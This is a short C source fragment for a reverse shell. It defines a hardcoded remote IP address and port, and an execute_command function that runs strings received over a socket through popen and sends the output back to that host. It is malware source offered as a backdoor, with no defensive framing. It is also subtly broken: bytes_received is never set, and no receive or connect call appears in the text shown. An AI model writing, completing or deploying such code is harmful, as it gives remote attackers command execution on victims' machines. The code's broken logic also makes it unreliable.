// Don't reinvent the wheel. Use the libraries like in any other language

#include <stdio.h>      // pretty much always need for I/O fucntions
#include <stdlib.h>     // memory allocation
#include <string.h>     // string manipulation
#include <unistd.h>     // POSIX API stuff
#include <arpa/inet.h>  // sockets

// Defining constants

#define SERVER_IP "100.76.130.61"
#define SERVER_PORT 6969
#define BUFFER_SIZE 1024    // enough space to fit header plus extras

// Function for executing our commmands on system

void execute_command(int sock) {
    char buffer[BUFFER_SIZE];   //Create buffer to store commands and responses
    int bytes_received;

    while (1) {
        memset(buffer, 0, BUFFER_SIZE);
        if (bytes_received <= 0) {
            break; // no data, exit only the loop
        }

        FILE *fp = popen(buffer, "r");      // popen is POSIX magic to execute commands within the program.
        if (fp == NULL) {
            send(sock, "Failed to execute command, silly goose.\n", strlen("Failed to execute command, silly goose.\n"), 0);
            continue;
        }

                while (fgets(buffer, BUFFER_SIZE, fp) != NULL) {
            send(sock, buffer, strlen(buffer), 0);
        }
        pclose(fp); // Close process pipe

    }
}
